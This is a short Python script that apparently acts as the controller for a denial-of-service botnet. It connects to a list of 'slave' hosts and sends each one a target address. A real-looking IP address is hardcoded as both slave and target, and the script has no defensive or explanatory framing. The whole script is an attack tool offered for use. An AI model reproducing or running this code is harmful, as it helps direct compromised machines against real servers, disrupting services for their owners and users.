#!/usr/bin/python
import socket
#Put Slave Addresses in addresses array
addresses=['157.55.200.140','157.55.200.140']
#Set target to url or IP - ie 127.0.0.1 or www.mysite.org
target = '157.55.200.140'
port = 80
for host in addresses:
	master = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	master.connect((host,port))
	master.send(target)
	master.close()
